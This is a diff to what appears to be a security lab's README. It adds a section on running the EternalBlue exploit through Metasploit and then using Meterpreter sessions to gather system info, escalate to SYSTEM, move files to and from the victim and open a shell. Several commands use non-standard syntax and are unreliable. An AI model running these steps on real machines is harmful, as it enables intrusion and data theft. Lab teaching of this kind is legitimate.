@@ -106,6 +106,60 @@ In the third terminal with the http server, ctrl-c once the GET request is made 
 ```bash 
 python eshuCLP/main.py
 ```
+# Using Meterpreter
+Once a successful exploit has been executed, you can use Meterpreter to interact with the compromised machine.
+### Example
+```bash
+search exploits eternalblue
+search auxiliary ssh
+run exploit windows/smb/ms17_010_eternalblue
+```
+
+## 1. Check active sessions
+To see active Meterpreter sessions:
+```bash
+sessions
+```
+This will list available sessions with their session ID.
+
+## 2. Interact with a session
+Replace <session_id> with an actual session ID from the list:
+```bash
+meterpreter <session_id> sysinfo
+```
+
+## 3. Run common Meterpreter commands
+Once inside a session, you can run various commands:
+
+System Information:
+```bash
+meterpreter <session_id> sysinfo
+```
+List Processes:
+```bash 
+meterpreter <session_id> ps
+```
+Get System Privileges:
+```bash
+meterpreter <session_id> getsystem
+```
+Upload a file:
+```bash
+meterpreter <session_id> upload /path/to/local/file /path/to/remote/file
+```
+Download a file
+```bash
+meterpreter <session_id> download /path/to/remote/file /path/to/local/file
+```
+Run a Shell
+```bash
+meterpreter <session_id> shell
+```
+## Exit Meterpreter Session
+To exit a Meterpreter session:
+```bash
+meterpreter <session_id> exit
+```
 
 #### Clean Up
 To stop all running containers
